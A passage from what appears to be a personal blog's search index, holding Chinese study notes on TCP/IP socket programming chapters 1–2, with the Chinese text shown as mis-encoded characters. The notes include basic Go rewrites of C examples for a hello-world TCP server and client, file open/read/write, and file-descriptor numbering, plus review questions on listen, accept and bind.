è¾“å¯¹æ•°æ®å®Œæ•´æ€§è¦æ±‚è¾ƒé«˜çš„æ–‡æœ¬æ–‡ä»¶ã€‚ c. ç½‘ä¸Šé“¶è¡Œç”¨æˆ·ä¸é“¶è¡Œä¹‹é—´çš„æ•°æ®ä¼ é€’(é¢å‘è¿æ¥) é¢å‘è¿æ¥çš„å¥—æ¥å­—æä¾›å¯é çš„ã€æŒ‰é¡ºåºä¼ é€çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œé€‚åˆå¯¹æ•°æ®å®Œæ•´æ€§å’Œå®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„ç½‘ä¸Šé“¶è¡Œäº¤æ˜“ã€‚ ä½•ç§ç±»å‹çš„å¥—æ¥å­—ä¸å­˜åœ¨æ•°æ®è¾¹ç•Œ?è¿™ç±»å¥—æ¥å­—æ¥æ”¶æ•°æ®æ—¶éœ€è¦æ³¨æ„ä»€ä¹ˆ? é¢å‘è¿æ¥çš„å¥—æ¥å­—ä¸å­˜åœ¨æ•°æ®è¾¹ç•Œã€‚é¢å‘è¿æ¥çš„TCPå¥—æ¥å­—åœ¨æ¥æ”¶æ•°æ®æ—¶éœ€è¦æ³¨æ„å¤„ç†ç²˜åŒ…å’Œæ‹†åŒ…çš„é—®é¢˜ï¼Œç¡®ä¿æŒ‰ç…§åº”ç”¨å±‚åè®®çš„è¦æ±‚æ­£ç¡®è§£æå’Œå¤„ç†æ¥æ”¶åˆ°çš„æ•°æ®\ntcp_server.cå’Œtcp_client.cä¸­éœ€å¤šæ¬¡è°ƒç”¨readå‡½æ•°è¯»å–æœåŠ¡å™¨ç«¯è°ƒç”¨Iæ¬¡writeå‡½æ•°ä¼ é€’çš„å­—ç¬¦ä¸²ã€‚æ›´æ”¹ç¨‹åº,ä½¿æœåŠ¡å™¨ç«¯å¤šæ¬¡è°ƒç”¨(æ¬¡æ•°è‡ªæ‹Ÿ)writeå‡½æ•°ä¼ è¾“æ•°æ®,å®¢æˆ·ç«¯è°ƒç”¨1 æ¬¡readå‡½æ•°è¿›è¡Œè¯»å–ã€‚ä¸ºè¾¾åˆ°è¿™ä¸€ç›®çš„,å®¢æˆ·ç«¯éœ€å»¶è¿Ÿè°ƒç”¨readå‡½æ•°,å› ä¸ºå®¢æˆ·ç«¯è¦ç­‰å¾…æœåŠ¡å™¨ç«¯ä¼ è¾“æ‰€æœ‰æ•°æ®ã€‚Windowså’ŒLinuxéƒ½é€šè¿‡ä¸‹åˆ—ä»£ç å»¶è¿Ÿreadæˆ–recvå‡½æ•°çš„è°ƒç”¨ã€‚for(1=0;i\u0026lt;3000;i++) printf(\u0026ldquo;wait time %d \\n\u0026rdquo;, i); è®©CPUæ‰§è¡Œå¤šä½™ä»»åŠ¡ä»¥å»¶è¿Ÿä»£ç è¿è¡Œçš„æ–¹å¼ç§°ä¸º â€œBusy Waitingâ€ã€‚ä½¿ç”¨å¾—å½“å³å¯æ¨è¿Ÿå‡½æ•°è°ƒç”¨ã€‚\n","date":"2023-11-11T12:48:30+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCPã€IPç½‘ç»œç¼–ç¨‹ç¬¬äºŒç« ç¬”è®°"},{"content":"1.1 ç†è§£ç½‘ç»œå’Œå¥—æ¥å­— å¥—æ¥å­— å¥—æ¥å­—ï¼ˆsocketï¼‰æ˜¯è®¡ç®—æœºç½‘ç»œä¸­è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒå°†è¿›ç¨‹é—´é€šä¿¡æŠ½è±¡ä¸ºä¸€ä¸ªç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹ç”±ä¸€ä¸ªIPåœ°å€å’Œä¸€ä¸ªç«¯å£å·æ¥æ ‡è¯†ã€‚ å¥—æ¥å­—æ˜¯ç½‘ç»œæ•°æ®ä¼ è¾“ç”¨çš„è½¯ä»¶è®¾å¤‡ã€‚ç½‘ç»œç¼–ç¨‹åˆç§°ä¸ºå¥—æ¥å­—ç¼–ç¨‹ã€‚\nç¼–å†™\u0026quot; Hello world! \u0026quot; æœ åŠ¡ å™¨ ç«¯ ç½‘ç»œç¼–ç¨‹ä¸­æ¥å—è¿æ¥è¯·æ±‚çš„å¥—æ¥å­—åˆ›å»ºè¿‡ç¨‹å¯æ•´ç†å¦‚ä¸‹ã€‚\nç¬¬ä¸€æ­¥:è°ƒç”¨s o c k e t å‡½æ•°åˆ›å»ºå¥—æ¥å­—ã€‚ ç¬¬äºŒæ­¥:è°ƒç”¨b i n d å‡½æ•°åˆ†é…Eåœ°å€å’Œç«¯å£å·ã€‚ ç¬¬ä¸‰æ­¥:è°ƒç”¨l i s t e n å‡½æ•°è½¬ä¸ºå¯æ¥æ”¶è¯·æ±‚çŠ¶æ€ã€‚ ç¬¬å››æ­¥:è°ƒç”¨a c c e p t å‡½æ•°å—ç†è¿æ¥è¯·æ±‚ã€‚ hello_server.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { //æ£€æŸ¥å‚æ•° if len(os.Args) != 2 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } //è®¾ç½®ç›‘å¬ç«¯å£å’Œä¿¡æ¯ message := \u0026#34;Hello world!\u0026#34; port := os.Args[1] //å½“ä½ è°ƒç”¨ net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) æ—¶ï¼ŒGo ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š //1.åˆ›å»ºä¸€ä¸ª TCP å¥—æ¥å­—ã€‚ //2.å°†å¥—æ¥å­—ç»‘å®šåˆ°æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å·ã€‚ //3.å°†å¥—æ¥å­—è½¬ä¸ºå¯æ¥æ”¶è¿æ¥çŠ¶æ€ listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) if err != nil { log.Fatalf(\u0026#34;socket() error: %v\u0026#34;, err) } //å»¶è¿Ÿå…³é—­ç›‘å¬ defer listener.Close() //å¾ªç¯ç›‘å¬ for { //4.Accept()æ¥æ”¶è¿æ¥ conn, err := listener.Accept() if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()å‘é€ä¿¡æ¯ _, err = conn.Write([]byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } conn.Close() } } client åˆ›å»ºå¥—æ¥å­—,ä½†æ­¤æ—¶å¥—æ¥å­—å¹¶ä¸é©¬ä¸Šåˆ†ä¸ºæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ã€‚å¦‚æœç´§æ¥ç€è°ƒç”¨bindå’Œlistenå‡½æ•°,å°†æˆä¸ºæœåŠ¡å™¨ç«¯å¥—æ¥å­—;å¦‚æœè°ƒç”¨connectå‡½æ•°å°†æˆä¸ºå®¢æˆ·ç«¯å¥—æ¥å­—ã€‚\nhello_client.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] port := os.Args[2] address := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, ip, port) //1.åˆ›å»ºä¸€ä¸ª TCP å¥—æ¥å­—ã€‚ //2.è°ƒç”¨ Connect() è¿æ¥åˆ°æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å·ã€‚ conn, err := net.Dial(\u0026#34;tcp\u0026#34;, address) if err != nil { log.Fatalf(\u0026#34;Failed to connect to server: %v\u0026#34;, err) } defer conn.Close() //net.Conn å¯¹è±¡æ¥è¯»å–æœåŠ¡å™¨å‘é€çš„æ¶ˆæ¯ message, err := io.ReadAll(conn) if err != nil { log.Fatalf(\u0026#34;Failed to read from server: %v\u0026#34;, err) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) } è¿è¡Œ ç¼–è¯‘è¿è¡ŒæœåŠ¡å™¨ 1 2 go build -o ch1/hello_server ch1/hello_server.go ./ch1/hello_server 8080 ç¼–è¯‘è¿è¡Œå®¢æˆ·ç«¯ 1 2 3 4 5 go build -o ch1/hello_client ch1/hello_client/hello_client.go ./ch1/hello_client 127.0.0.1 8080 Message from server: Hello world! 1.2 æ–‡ä»¶æ“ä½œ æ‰“å¼€æ–‡ä»¶ é¦–å…ˆä»‹ç»æ‰“å¼€æ–‡ä»¶ä»¥è¯»å†™æ•°æ®çš„å‡½æ•°ã€‚ è°ƒç”¨æ­¤å‡½æ•°æ—¶éœ€ä¼ é€’ä¸¤ä¸ªå‚æ•°:ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰“å¼€çš„ç›®æ ‡æ–‡ä»¶ååŠè·¯å¾„ä¿¡æ¯,ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶æ‰“å¼€æ¨¡å¼(æ–‡ä»¶ç‰¹æ€§ä¿¡æ¯)ã€‚\n1 2 3 4 5 6 7 #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int open(const char * path ï¼Œint flag) //æˆåŠŸæ—¶è¿”å›æ–‡ä»¶æè¿°ç¬¦äº‹å¤±è´¥æ—¶è¿”å›1 //path æ–‡ä»¶åå­—ç¬¦ä¸²åœ°å€ //flag æ–‡ä»¶æ‰“å¼€æ¨¡å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func Open(name string) (*File, error) { return OpenFile(name, O_RDONLY, 0) } // OpenFile æ˜¯ä¸€ä¸ªé€šç”¨çš„æ–‡ä»¶æ‰“å¼€å‡½æ•°ï¼Œå®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼šæ–‡ä»¶åã€æ‰“å¼€æ–‡ä»¶çš„æ ‡å¿—å’Œæ–‡ä»¶æƒé™ã€‚ // å®ƒè¿”å›ä¸€ä¸ª *os.File å¯¹è±¡å’Œä¸€ä¸ª error å¯¹è±¡ã€‚å¦‚æœæ‰“å¼€æ–‡ä»¶å¤±è´¥ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªé nil çš„ error å¯¹è±¡ã€‚ func OpenFile(name string, flag int, perm FileMode) (*File, error) { // è®°å½•æ‰“å¼€æ–‡ä»¶çš„æ“ä½œ testlog.Open(name) // ä½¿ç”¨ openFileNolog å‡½æ•°æ‰“å¼€æ–‡ä»¶ï¼Œè¿™ä¸ªå‡½æ•°ä¸è®°å½•æ—¥å¿— f, err := openFileNolog(name, flag, perm) // å¦‚æœæ‰“å¼€æ–‡ä»¶å¤±è´¥ï¼Œè¿”å›é”™è¯¯ if err != nil { return nil, err } // æ£€æŸ¥æ‰“å¼€æ–‡ä»¶çš„æ ‡å¿—æ˜¯å¦åŒ…å« O_APPENDï¼Œå¦‚æœåŒ…å«ï¼Œè®¾ç½® f.appendMode ä¸º true f.appendMode = flag\u0026amp;O_APPEND != 0 // è¿”å›æ‰“å¼€çš„æ–‡ä»¶ return f, nil } å…³é—­æ–‡ä»¶ 1 2 3 4 #include \u0026lt;unistd.h\u0026gt; int close(int fd); //æˆåŠŸæ—¶è¿”å›Q,å¤±è´¥æ—¶è¿”å›-1ã€‚ //fd:éœ€è¦å…³é—­çš„æ–‡ä»¶æˆ–å¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ 1 2 3 4 5 6 7 8 9 10 // Close closes the File, rendering it unusable for I/O. // On files that support SetDeadline, any pending I/O operations will // be canceled and return immediately with an ErrClosed error. // Close will return an error if it has already been called. func (f *File) Close() error { if f == nil { return ErrInvalid } return f.file.close() } å°†æ•°æ®å†™å…¥æ–‡ä»¶ 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t write(int fd, const void * buf, size_t nbytes); //æˆåŠŸæ—¶è¿”å›å†™å…¥çš„å­—èŠ‚æ•°,å¤±è´¥æ—¶è¿”å›-1ã€‚ //fd:æ•°æ®ä¼ è¾“å¯¹è±¡çš„æ–‡ä»¶æè¿°ç¬¦ //buf ä¿å­˜æ•°æ®çš„ç¼“å†²åœ°å€ //nbytesï¼šè¦ä¼ è¾“çš„å­—èŠ‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // write writes len(b) bytes to the File. // It returns the number of bytes written and an error, if any. // write æ˜¯ File ç»“æ„ä½“çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒæ¥å—ä¸€ä¸ªå­—èŠ‚åˆ‡ç‰‡ b ä½œä¸ºå‚æ•°ï¼Œ // å°è¯•å°†è¿™ä¸ªå­—èŠ‚åˆ‡ç‰‡å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚ func (f *File) write(b []byte) (n int, err error) { // f.pfd.Write(b) è°ƒç”¨ pfdï¼ˆä»£è¡¨å¹³å°ä¾èµ–çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰çš„ Write æ–¹æ³•ï¼Œ // å°è¯•å°† b å†™å…¥åˆ°æ–‡ä»¶ã€‚è¿™ä¸ªæ–¹æ³•è¿”å›å†™å…¥çš„å­—èŠ‚æ•°å’Œä¸€ä¸ªé”™è¯¯ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚ n, err = f.pfd.Write(b) // runtime.KeepAlive(f) æ˜¯ä¸€ä¸ªç”¨äºé˜²æ­¢ f è¢«åƒåœ¾å›æ”¶çš„è°ƒç”¨ã€‚ // åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœ f åœ¨ f.pfd.Write(b) è°ƒç”¨ä¹‹åæ²¡æœ‰è¢«å†æ¬¡ä½¿ç”¨ï¼Œ // Go çš„åƒåœ¾å›æ”¶å™¨å¯èƒ½ä¼šåœ¨ Write è°ƒç”¨è¿˜åœ¨è¿›è¡Œæ—¶å°±å›æ”¶ fã€‚ // runtime.KeepAlive(f) ç¡®ä¿ f åœ¨ Write è°ƒç”¨å®Œæˆä¹‹å‰ä¸ä¼šè¢«åƒåœ¾å›æ”¶ã€‚ runtime.KeepAlive(f) // è¿”å›å†™å…¥çš„å­—èŠ‚æ•°å’Œé”™è¯¯ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ return n, err } ä»£ç ç¤ºä¾‹æ”¹å†™ low_open.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { buf := []byte(\u0026#34;Let\u0026#39;s go!\\n\u0026#34;) //æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨åˆ™æ¸…ç©ºï¼Œæƒé™ä¸º 0644 f, err := os.OpenFile(\u0026#34;data.txt\u0026#34;, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //å†™å…¥æ–‡ä»¶ _, err = f.Write(buf) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } } è¿è¡Œä»£ç \n1 2 3 go build -o ch1/low_open ch1/lowOpen/low_open.go ./ch1/low_open file descriptor: 3 è¯»å–æ•°æ® 1 2 3 4 5 6 #include \u0026lt;unistd.h\u0026gt; ssize_t read(int fdJ void * buf, size_t nbytes); //\u0026#39;æˆåŠŸæ—¶è¿”å›æ¥æ”¶çš„å­—èŠ‚æ•°(ä½†é‡åˆ°æ–‡ä»¶ç»“å°¾åˆ™è¿”å›Î¸),å¤±è´¥æ—¶è¿”å›10 //fd æ˜¾ç¤ºæ•°æ®æ¥æ”¶å¯¹è±¡çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ //buf è¦ä¿å­˜æ¥æ”¶æ•°æ®çš„ç¼“å†²åœ°å€å€¼ã€‚ //nbytes è¦æ¥æ”¶æ•°æ®çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ ç¤ºä¾‹ä»£ç æ”¹å†™ low_read.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import ( \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func main() { //åªè¯»æ‰“å¼€æ–‡ä»¶ f, err := os.Open(\u0026#34;data.txt\u0026#34;) if err != nil { log.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) } defer f.Close() //è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦ log.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) //è¯»å–æ–‡ä»¶ buf := make([]byte, 1024) n, err := f.Read(buf) if err != nil { log.Fatalf(\u0026#34;read() error: %v\u0026#34;, err) } log.Printf(\u0026#34;file data: %s\u0026#34;, buf[:n]) } è¿è¡Œä»£ç \n1 2 3 4 5 go build -o ch1/low_read ch1/lowRead/low_read.go ./ch1/low_read 2023/11/10 16:45:54 file descriptor: 3 2023/11/10 16:45:54 file data: Let\u0026#39;s go! æ–‡ä»¶æè¿°ç¬¦ä¸å¥—æ¥å­— åŸæ–‡cä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; int main() { int fd1, fd2, fd3; //åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å’Œä¸¤ä¸ªå¥—æ¥å­— fd1 = socket(PF_INET, SOCK_STREAM, 0); fd2 = open(\u0026#34;test.dat\u0026#34;, O_CREAT | O_WRONLY | O_TRUNC); fd3 = socket(PF_INET, SOCK_DGRAM, 0); //è¾“å‡ºä¹‹å‰åˆ›å»ºçš„æ–‡ä»¶æè¿°ç¬¦çš„æ•´æ•°å€¼ printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1); printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2); printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3); close(fd1); close(fd2); close(fd3); return 0; } æ”¹å†™å fd_seri.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { // ä½¿ç”¨ syscall.Socket å‡½æ•°åˆ›å»ºä¸€ä¸ª TCP å¥—æ¥å­—ï¼Œè¿”å›çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ fd1 fd1, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // ä½¿ç”¨ os.OpenFile å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ \u0026#34;test.dat\u0026#34;ï¼Œè¿”å›çš„æ˜¯ *os.File ç±»å‹çš„ fd2 fd2, _ := os.OpenFile(\u0026#34;test.dat\u0026#34;, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644) // ä½¿ç”¨ syscall.Socket å‡½æ•°åˆ›å»ºä¸€ä¸ª UDP å¥—æ¥å­—ï¼Œè¿”å›çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ fd3 fd3, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0) // ä½¿ç”¨ fmt.Printf å‡½æ•°æ‰“å°å‡ºä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å€¼ // æ³¨æ„ï¼Œå¯¹äº *os.File ç±»å‹çš„ fd2ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† Fd æ–¹æ³•æ¥è·å–å…¶åº•å±‚çš„æ–‡ä»¶æè¿°ç¬¦ fmt.Printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1) fmt.Printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2.Fd()) fmt.Printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3) // ä½¿ç”¨ Close æ–¹æ³•å’Œ syscall.Close å‡½æ•°å…³é—­äº†è¿™ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä»¥é‡Šæ”¾ç³»ç»Ÿèµ„æº fd2.Close() syscall.Close(fd1) syscall.Close(fd3) } è¿è¡Œ\n1 2 3 4 5 go build -o ch1/fd_seri ch1/fdSeri/fd_seri.go ./ch1/fd_seri file descriptor 1: 3 file descriptor 2: 4 file descriptor 3: 5 1.3 åŸºäºWindowså¹³å°çš„å®ç° ç•¥\n1.4 åŸºäºWindowsçš„å¥—æ¥å­—ç›¸å…³å‡½æ•°åŠç¤ºä¾‹ 1.5 ä¹ é¢˜ å¥—æ¥å­—åœ¨ç½‘ç»œç¼–ç¨‹ä¸­çš„ä½œç”¨æ˜¯ä»€ä¹ˆ?ä¸ºä½•ç§°å®ƒä¸ºå¥—æ¥å­—? å¥—æ¥å­—ï¼ˆsocketï¼‰æ˜¯ç½‘ç»œç¼–ç¨‹ä¸­çš„æŠ½è±¡æ¦‚å¿µï¼Œå®ƒæä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—ä¸åŒè®¡ç®—æœºä¹‹é—´å¯ä»¥è¿›è¡Œé€šä¿¡å’Œæ•°æ®äº¤æ¢ã€‚å¥—æ¥å­—å¯ä»¥çœ‹ä½œæ˜¯ç½‘ç»œé€šä¿¡çš„ç«¯ç‚¹ï¼Œå®ƒåŒ…å«äº†é€šä¿¡æ‰€éœ€çš„å„ç§ä¿¡æ¯ï¼Œå¦‚IPåœ°å€ã€ç«¯å£å·ã€åè®®ç­‰ã€‚å¥—æ¥å­—çš„åç§°æ¥æºäºæ’åº§ï¼ˆsocketï¼‰ï¼Œç±»æ¯”æ’åº§è¿æ¥ç”µå™¨ï¼Œå¥—æ¥å­—è¿æ¥ç½‘ç»œã€‚é€šè¿‡å¥—æ¥å­—ï¼Œè®¡ç®—æœºå¯ä»¥åœ¨ç½‘ç»œä¸Šè¿›è¡Œæ•°æ®çš„å‘é€å’Œæ¥æ”¶ï¼Œå®ç°ç½‘ç»œé€šä¿¡çš„åŠŸèƒ½ã€‚\nåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºå¥—æ¥å­—å,ä¼šä¾æ¬¡è°ƒç”¨listenå‡½æ•°å’Œaccept å‡½æ•°ã€‚è¯·æ¯”è¾ƒå¹¶è¯´æ˜äºŒè€…ä½œç”¨ã€‚ listenå‡½æ•°ç”¨äºå°†å¥—æ¥å­—æ ‡è®°ä¸ºè¢«åŠ¨å¥—æ¥å­—ï¼Œå³ç”¨äºæ¥å—å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚å®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿè¯¥å¥—æ¥å­—å°†ç”¨äºæ¥å—ä¼ å…¥çš„è¿æ¥ï¼Œè€Œä¸æ˜¯å‘èµ·è¿æ¥ã€‚åœ¨è°ƒç”¨listenå‡½æ•°åï¼Œå¥—æ¥å­—å°†è¿›å…¥ç›‘å¬çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚ acceptå‡½æ•°ç”¨äºä»å¤„äºç›‘å¬çŠ¶æ€çš„å¥—æ¥å­—ä¸­æ¥å—ä¸€ä¸ªè¿æ¥ã€‚å½“å®¢æˆ·ç«¯å°è¯•è¿æ¥åˆ°æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨è°ƒç”¨acceptå‡½æ•°æ¥æ¥å—è¿™ä¸ªè¿æ¥ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„å¥—æ¥å­—æ¥ä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ã€‚è¿™ä¸ªæ–°çš„å¥—æ¥å­—å¯ä»¥ç”¨äºä¸è¯¥å®¢æˆ·ç«¯è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œè€ŒåŸå§‹çš„ç›‘å¬å¥—æ¥å­—åˆ™ç»§ç»­ç­‰å¾…å…¶ä»–å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚acceptå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ–°çš„å¥—æ¥å­—ï¼Œé€šè¿‡å®ƒå¯ä»¥è¿›è¡Œä¸å®¢æˆ·ç«¯çš„é€šä¿¡ã€‚\nLinuxä¸­,å¯¹å¥—æ¥å­—æ•°æ®è¿›è¡ŒI/Oæ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨æ–‡ä»¶I/O ç›¸å…³å‡½æ•°;è€Œåœ¨Windowsä¸­åˆ™ä¸å¯ä»¥ã€‚åŸå› ä¸ºä½•? è¿™æ˜¯å› ä¸ºåœ¨Linuxä¸­ï¼Œå¥—æ¥å­—è¢«è§†ä¸ºä¸€ç§æ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ–‡ä»¶I/Oç›¸å…³å‡½æ•°ï¼ˆå¦‚readå’Œwriteï¼‰æ¥è¿›è¡ŒI/Oæ“ä½œã€‚è€Œåœ¨Windowsä¸­ï¼Œå¥—æ¥å­—å’Œæ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸åŒçš„æ¦‚å¿µï¼ŒWindowsé‡‡ç”¨äº†ä¸åŒçš„I/Oæ¨¡å‹ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ä½¿ç”¨æ–‡ä»¶I/Oç›¸å…³å‡½æ•°æ¥å¯¹å¥—æ¥å­—æ•°æ®è¿›è¡ŒI/Oæ“ä½œã€‚åœ¨Windowsä¸­ï¼Œéœ€è¦ä½¿ç”¨ç‰¹å®šçš„å¥—æ¥å­—I/Oå‡½æ•°ï¼ˆå¦‚recvå’Œsendï¼‰æ¥è¿›è¡Œå¥—æ¥å­—æ•°æ®çš„è¯»å†™æ“ä½œã€‚\nåˆ›å»ºå¥—æ¥å­—åä¸€èˆ¬ä¼šç»™å®ƒåˆ†é…åœ°å€,ä¸ºä»€ä¹ˆ?ä¸ºäº†å®Œæˆåœ°å€åˆ†é…éœ€è¦è°ƒç”¨å“ªä¸ªå‡½æ•° åˆ›å»ºå¥—æ¥å­—åéœ€è¦ç»™å®ƒåˆ†é…åœ°å€ï¼Œè¿™æ˜¯ä¸ºäº†è®©å…¶ä»–ä¸»æœºèƒ½å¤Ÿæ‰¾åˆ°å¹¶ä¸è¯¥å¥—æ¥å­—è¿›è¡Œé€šä¿¡ã€‚åœ¨ç½‘ç»œç¼–ç¨‹ä¸­ï¼Œè¿™ä¸ªåœ°å€é€šå¸¸æ˜¯IPåœ°å€å’Œç«¯å£å·çš„ç»„åˆã€‚ ä¸ºäº†å®Œæˆåœ°å€åˆ†é…ï¼Œéœ€è¦è°ƒç”¨bindå‡½æ•°ã€‚bindå‡½æ•°å°†ä¸€ä¸ªæœ¬åœ°åœ°å€ï¼ˆIPåœ°å€å’Œç«¯å£å·ï¼‰åˆ†é…ç»™å¥—æ¥å­—ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºå¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€ä¸è¯¥å¥—æ¥å­—è¿›è¡Œé€šä¿¡ã€‚\nLinuxä¸­çš„æ–‡ä»¶æè¿°ç¬¦ä¸Windowsçš„å¥æŸ„å®é™…ä¸Šéå¸¸ç±»ä¼¼ã€‚è¯·ä»¥å¥—æ¥å­—ä¸ºå¯¹è±¡è¯´æ˜å®ƒä»¬çš„å«ä¹‰ã€‚ æ–‡ä»¶æè¿°ç¬¦å’ŒWindowsçš„å¥æŸ„åœ¨å¥—æ¥å­—çš„ä¸Šä¸‹æ–‡ä¸­å…·æœ‰ç±»ä¼¼çš„å«ä¹‰ã€‚å®ƒä»¬éƒ½æ˜¯ç”¨æ¥æ ‡è¯†å’Œå¼•ç”¨å¥—æ¥å­—çš„æŠ½è±¡æ¦‚å¿µã€‚ åœ¨Linuxä¸­ï¼Œå¥—æ¥å­—ä¹Ÿè¢«è§†ä¸ºä¸€ç§æ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºæ–‡ä»¶I/Oçš„æ“ä½œæ¥è¿›è¡Œå¥—æ¥å­—çš„è¯»å†™ç­‰æ“ä½œã€‚ åœ¨Windowsä¸­ï¼Œå¥—æ¥å­—ä½¿ç”¨å¥æŸ„æ¥è¿›è¡Œå¼•ç”¨å’Œæ“ä½œï¼Œå¥æŸ„æ˜¯ä¸€ç§æŠ½è±¡çš„å¼•ç”¨ç±»å‹ï¼Œå¯ä»¥ç”¨æ¥æ ‡è¯†å’Œæ“ä½œå¥—æ¥å­—ã€‚ å› æ­¤ï¼Œæ— 